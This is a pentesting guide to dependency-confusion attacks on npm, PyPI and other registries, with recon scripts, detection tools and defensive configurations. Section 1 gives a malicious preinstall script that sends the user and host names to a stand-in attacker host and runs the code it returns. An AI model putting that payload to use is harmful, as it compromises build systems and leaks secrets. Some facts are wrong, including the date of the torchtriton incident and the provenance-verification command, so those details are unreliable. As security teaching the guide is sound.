# CI/CD Supply Chain — Dependency Confusion Deep Dive

> Deep-dive companion to `skills/ci-cd-supply-chain-attack/SKILL.md`.
>
> Audience: pentesters running engagements against organizations that mix internal and public package registries. This guide covers the dependency-confusion attack class in depth: the original 2021 Alex Birsan research, namespace collision patterns, the 2022–2024 VerConfusion / Sovell campaigns, detection tools (socket.dev, Snyk, Sonatype), and the durable defenses (scoped packages, provenance, private registry isolation).

---

## Overview

Dependency confusion is the attack class where an attacker publishes a public package with the same name as an organization's internal private package, and the organization's build system pulls the public (attacker-controlled) version. The technique was systematized in February 2021 by Alex Birsan (in a peer-reviewed disclosure that compromised 35+ companies including Apple, Microsoft, Tesla, PayPal, Uber, Shopify, Netflix, and Yelp). Birsan's research was the most-cited supply chain paper of 2021 and is now a CVSS-9 baseline finding in every modern cloud pentest.

The root cause is asymmetric: public registries (npm, PyPI, RubyGems, Maven) have open registration — anyone can publish anything — but most organizations' package managers default to checking the public registry first. If an org's internal package is `@myorg/auth` and `myorg-auth` is also a public package name the org once pulled, the build is ambiguous. Worse, many package managers (npm, pip) silently fall back to the public registry if the private registry doesn't have the package — an attacker who can guess internal package names can register them on the public registry and wait.

The durable defense is namespace isolation: scoped packages (npm), private registry pinning (pip `--index-url`), and provenance verification (SLSA / Sigstore). This guide walks the attacks, the detection, and the defense.

---

## 1. The Original Birsan Research (February 2021)

### Background

Alex Birsan's February 9, 2021 write-up "Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies" documented the technique. Birsan harvested internal package names from public sources (`package.json` files in JavaScript bundles shipped by Apple, Microsoft, etc.; `requirements.txt` files in leaked Docker images; PyPI install logs). He then registered those names on the public registries with malicious `preinstall` / `setup.py` scripts that exfiltrated the build environment's hostname, user, and CI secrets.

### The Attack

```bash
# Step 1: Harvest internal package names from client's public artifacts
# - bundle.js contains require() calls
# - Docker images may contain package.json or requirements.txt
# - Sonatype OSS Index / socket.dev enumerate "internal-looking" names
cat apple-bundle.js | grep -oE 'require\(["\x27]@?[a-z0-9_-]+/["\x27]' | sort -u

# Step 2: Pick a name that's internal-only (not on public registry)
for pkg in mycompany-utils myorg-internal-config myteam-shared-types; do
  curl -s "https://registry.npmjs.org/$pkg" | jq '.error' 
  # "Not found" means the name is registrable
done

# Step 3: Publish a malicious version (after pre-authorization!)
mkdir mycompany-utils && cd mycompany-utils
npm init -y
cat > package.json <<EOF
{
  "name": "mycompany-utils",
  "version": "99.0.0",
  "scripts": {
    "preinstall": "curl -s https://attacker.example.com/$(whoami)/$(hostname) | sh"
  }
}
EOF
npm publish --access public

# Step 4: Wait for the client's next build to pull the public version
# (because public registry is checked first, and version 99.0.0 > internal version)
```

### Why It Worked

Birsan's research was authorized by every target company. The technique worked because:

1. **Default registry precedence.** npm's `.npmrc` resolution checks `registry.npmjs.org` first unless scoped `@myorg` packages are explicitly routed to a private registry.
2. **Version preference.** npm's semver resolver picks the highest version. If the attacker publishes `99.0.0` and the internal version is `1.2.3`, the public version wins.
3. **Silent fallback.** pip's `--extra-index-url` falls back to the public PyPI if the private registry 404s the name — exactly the dependency-confusion primitive.

### Impact

Birsan disclosed to 35+ companies. Apple, Microsoft, PayPal, Shopify, Netflix, Yelp, and others awarded bug bounties. Sonatype, Snyk, and Socket.dev built products around the attack class. The technique became a standard red-team finding.

---

## 2. Namespace Collision Patterns

### The Three Patterns

| Pattern | Example | Severity |
|---------|---------|----------|
| **Internal-only on private, public lookalike registered by attacker** | `myorg-auth` (private) vs `myorg-auth` (public attacker) | Critical — RCE on build |
| **Scope squatting** | `@myorg/utils` (private) vs `@myorg-utils/x` (public attacker, looks like a sub-package) | High — confusion + typosquat |
| **Typosquat + confusion** | `requests` (legit PyPI) vs `reqeusts` (typosquat) vs internal `requests` (private) | High — install-time malice |

### The PyTorch Case (December 2023)

PyTorch nightly depended on `torchtriton`, an internal package name. PyTorch's install path pulled from public PyPI as a fallback. An attacker registered `torchtriton` on public PyPI with a malicious `setup.py` that exfiltrated `~/.ssh`, `/etc/passwd`, and cloud creds. See the case-studies guide for the full timeline.

### The VerConfusion / Sovell Campaign (2022–2024)

In 2022–2024, a sustained campaign named VerConfusion (by Checkmarx) and a related cluster named Sovell published hundreds of dependency-confusion and typosquat packages across npm, PyPI, and RubyGems. The packages masqueraded as internal-sounding names (`company-internal-utils`, `corp-config`, `team-shared`) and as typosquats of popular packages. The campaign harvested credentials via `preinstall` scripts and exfiltrated to attacker-controlled domains.

### Hands-on: Enumerate Client's Namespace Exposure

```bash
# Enumerate package names from client's public artifacts
# - Front-end bundles
curl -s https://client.com/static/bundle.js | \
  grep -oE 'require\(["\x27][^"\x27]+["\x27]\)' | sort -u

# - Docker images (if authorized)
docker pull client/app:latest
docker run --rm client/app:latest cat /app/package.json | jq '.dependencies | keys'

# - Python projects (requirements.txt in GitHub)
gh search code --owner myclient "extra-index-url" --filename "requirements.txt"

# Cross-reference: which names are NOT on public registries (i.e., registrable)?
for pkg in $(cat internal-names.txt); do
  if ! curl -s "https://registry.npmjs.org/$pkg" | jq -e '.name' >/dev/null; then
    echo "REGISTRABLE: $pkg"
  fi
done
```

---

## 3. Detection — Socket.dev, Snyk, Sonatype

### Socket.dev

Socket.dev is a supply-chain scanner that hooks into GitHub PRs (Dependabot, Renovate) and CI workflows. It scores each package on:

- **Install scripts** (`preinstall`, `postinstall`, `setup.py`) — high risk if non-trivial.
- **Network access** during install — high risk for any non-trivial install.
- **Maintainer account age** — newly-created accounts publishing popular packages flagged.
- **Typosquat / namespace similarity** — flagged.
- **Provenance** — packages without SLSA / Sigstore provenance flagged.

### Snyk

Snyk Open Source scans dependencies for known vulnerabilities and supply-chain risk. Snyk's "Supply Chain" feature flags:

- Packages with install scripts.
- Packages with mismatched repo vs registry metadata.
- Packages with high maintainer churn.
- Typosquats.

### Sonatype Nexus Lifecycle / OSS Index

Sonatype was the first vendor to commercialize dependency-confusion detection. Nexus Lifecycle policies can:

- Block packages with install scripts by default.
- Enforce allow-lists of trusted packages.
- Quarantine new packages for review.

### Hands-on: Run Detection Tools

```bash
# Socket.dev: install the GitHub App on the target org, then scan a PR
gh extension install socketdev/cli 2>/dev/null || npm install -g @socketsecurity/cli
socket scan --org myclient --repo myclient/app

# Snyk Open Source
npm install -g snyk
snyk auth $SNYK_TOKEN
snyk test --all-projects --org=myclient

# Sonatype OSS Index (free)
pip install ossindex-lib || npm install -g @sonatype/ossindex-js
ossindex-cli --audit package-lock.json

# Syft + Grype (open-source alternative)
syft dir:. -o json > sbom.json
grype sbom:sbom.json
```

---

## 4. Defense — Scoped Packages, Provenance, Private Registry Isolation

### Defense 1: Scoped Packages (npm)

The first defense is to scope internal packages and route scopes to private registries. A `.npmrc` in every consuming project:

```ini
# .npmrc — route @myorg scope to private registry, everything else to public
@myorg:registry=https://npm.pkg.github.com
registry=https://registry.npmjs.org
always-auth=true
```

With this, npm only pulls `@myorg/*` from the private registry — a public `@myorg/auth` cannot intercept because GitHub Container Registry (the private registry) is queried first for the scope.

### Defense 2: pip Index URL Isolation

For Python, do NOT use `--extra-index-url` (which falls back to public PyPI). Use `--index-url` exclusively:

```ini
# pip.conf — private registry ONLY, no public fallback
[global]
index-url = https://pypi.mycompany.com/simple/
extra-index-url =   # EMPTY — do not set this
no-index = false
```

The org's private PyPI mirror (Artifactory, Nexus, AWS CodeArtifact, Google Artifact Registry) proxies the public PyPI for legitimate external packages. Internal packages live only on the private mirror.

### Defense 3: Provenance (SLSA / Sigstore)

Provenance is the durable fix. Every package published by the org should carry a SLSA Level 3 provenance attestation, which contains:

- The source repo + commit SHA.
- The build workflow + runner.
- The build inputs (dependencies + versions).
- The signature (Sigstore / cosign).

Consumers verify the attestation before install:

```bash
# npm provenance verification (npm 9.5+)
npm install --provenance @myorg/auth@1.2.3
# Verifies: package was built by GitHub Actions in myorg/repo at commit abc123...

# PyPI: sigstore Python signing
pip install sigstore
python -m sigstore verify --certificate-identity "https://github.com/myorg/repo/.github/workflows/publish.yml@refs/tags/v1.2.3" \
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
  myorg_auth-1.2.3-py3-none-any.whl
```

### Defense 4: Pre-publish Review (No Auto-Merge for New Names)

For npm: block auto-merge of Dependabot PRs that introduce a new package name (not version bump). Run Socket.dev / Snyk on every PR; block merge if any package scores high-risk.

---

## 5. Hands-on: End-to-End Dependency Confusion Engagement

### Step-by-step: Authorized Confusion Test

> **WARNING**: Do NOT run this against any target without explicit written authorization. The 2021 Birsan research was pre-authorized by every target. Unauthorized publication of a malicious package is a CFAA felony (US) and equivalents elsewhere.

```bash
# Phase 1: Recon — enumerate internal-sounding package names
# (See Section 2 enumeration commands)

# Phase 2: Coordinate with client — agree on a sandbox scope
# Client creates an isolated npm scope (e.g., @pentest-confusion) that the
# client owns, and authorizes the pentester to publish to it.

# Phase 3: Publish the benign-but-logging package
mkdir @pentest-confusion/canary && cd $_
npm init --scope=@pentest-confusion -y
cat > package.json <<EOF
{
  "name": "@pentest-confusion/canary",
  "version": "1.0.0",
  "scripts": { "postinstall": "node -e \"console.log('CANARY: ' + process.env.USER + '@' + require('os').hostname())\"" }
}
EOF
npm publish --access public

# Phase 4: Have the client add @pentest-confusion/canary to a test project
# (or pre-stage a project that references it)

# Phase 5: Trigger a build — observe the postinstall output in CI logs

# Phase 6: Rollback
npm unpublish @pentest-confusion/canary --force
```

### Step-by-step: Audit Client's Defenses

```bash
# 1. Check .npmrc for scope isolation
find . -name ".npmrc" -exec cat {} \;
# Expected: @myorg:registry=https://private.registry/

# 2. Check pip.conf for index-url isolation
find / -name "pip.conf" 2>/dev/null -exec cat {} \;
# Expected: index-url=https://private.registry/simple/, NO extra-index-url

# 3. Check CI for provenance verification
grep -rn "provenance" .github/workflows/ .gitlab-ci.yml Jenkinsfile
grep -rn "sigstore\|cosign" .github/workflows/

# 4. Check for install-script policy (Socket.dev, Nexus Lifecycle)
gh extension list | grep socket
cat .github/workflows/socket.yml 2>/dev/null

# 5. Check for allow-list (most orgs have none — this is a finding)
find . -name "package-allow-list*" -o -name "allowed-packages*"
```

### Step-by-step: Build the Defense

The engagement deliverable is a `.npmrc` template + a CI policy. Example CI policy (GitHub Actions):

```yaml
# .github/workflows/dependency-gate.yml
name: Dependency Gate
on: [pull_request]
jobs:
  gate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: '20' }
      - name: Verify provenance
        run: |
          npm install --provenance --dry-run
          if [ $? -ne 0 ]; then exit 1; fi
      - name: Socket security scan
        uses: socketsecurity/github-action@v1
        with:
          overlay: strict
      - name: Block new packages
        run: |
          # Diff package-lock.json: if new names introduced, block unless allow-listed
          git diff origin/main HEAD -- package-lock.json | \
            grep -E '^\+.*"node_modules/' | \
            awk -F'"' '{print $2}' | sort -u | while read pkg; do
              grep -q "^$pkg$" allow-list.txt || { echo "BLOCKED: $pkg"; exit 1; }
            done
```

---

## 6. Cross-Registry Confusion Patterns

### Maven (Java)

Maven resolves dependencies in repository order defined in `settings.xml`. If an internal repo is listed second and a public repo has the same `groupId:artifactId`, the public version wins. Defense: list internal repos first; use `<mirror>` with `<mirrorOf>*</mirrorOf>` to force all resolution through the internal proxy.

### RubyGems

RubyGems resolves in `source` order. If a `Gemfile` has `source "https://rubygems.org"` and `source "https://gems.mycompany.com"`, the order matters. Defense: use a single private source that proxies RubyGems.

### Go Modules

Go modules use the GOPROXY list. If `GOPROXY=https://proxy.golang.org,direct`, the public proxy is queried first. Internal Go modules should be served via a private Athens / JFrog Go proxy with `GONOSUMCHECK` and `GONOSUMDB` for internal paths.

### Container Registries (Docker)

Docker image tags are mutable — `mycompany/app:latest` can be re-tagged. Defense: pin images to immutable digests (`mycompany/app@sha256:abc...`), and use cosign to verify signatures.

---

## References

1. Alex Birsan — Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies (Feb 2021) — https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
2. PyTorch Security Advisory — torchtriton confusion (December 2023) — https://pytorch.org/blog/compromised-nightly-dependency/
3. Checkmarx — VerConfusion campaign research — https://checkmarx.com/blog/
4. Socket.dev — Dependency Confusion research hub — https://socket.dev/blog
5. Snyk — Supply Chain Security Best Practices — https://snyk.io/learn/application-security/supply-chain-security/
6. Sonatype — 2024 State of the Software Supply Chain Report — https://www.sonatype.com/state-of-the-software-supply-chain/2024
7. npm Blog — Scoped packages documentation — https://docs.npmjs.com/cli/v10/using-npm/scope
8. Python pip — `--index-url` vs `--extra-index-url` documentation — https://pip.pypa.io/en/stable/user_guide/#installing-from-a-package-index
9. GitHub Container Registry — npm scope routing — https://docs.github.com/en/packages/working-with-a-github-packages-registry/working-with-the-npm-registry
10. AWS CodeArtifact — private PyPI / npm mirror — https://docs.aws.amazon.com/codeartifact/latest/ug/welcome.html
11. Google Artifact Registry — multi-format private registry — https://cloud.google.com/artifact-registry/docs
12. SLSA Framework — provenance specification — https://slsa.dev/spec/v1.0/
13. Sigstore — cosign Python package signing — https://docs.sigstore.dev/cosign/
14. OpenSSF Scorecard — supply chain security scoring — https://github.com/ossf/scorecard
15. CISA — Software Supply Chain Security Guide (ESF) — https://www.cisa.gov/resources-tools/resources/securing-software-supply-chain
16. Sonatype OSS Index — free vulnerability database — https://ossindex.sonatype.org/
17. Syft / Grype — open-source SBOM and vulnerability scanner — https://github.com/anchore/syft
18. Athens — private Go module proxy — https://github.com/gomods/athens
19. Google SRE — Build Provenance — https://sre.google/sre-book/
20. GitHub Advisory Database — supply chain advisories — https://github.com/advisories
